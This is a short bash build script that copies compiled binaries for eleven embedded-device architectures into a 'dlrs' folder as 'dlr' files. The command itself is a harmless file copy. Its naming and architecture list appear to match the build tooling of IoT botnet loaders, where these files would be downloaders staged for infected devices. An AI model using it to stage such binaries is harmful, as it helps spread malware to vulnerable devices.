#!/bin/bash

for arch in arm arm5 arm6 arm7 m68k mips mpsl ppc sh4 x86 x86_64; do
    cp "release/main_$arch" "dlrs/dlr.$arch"
done
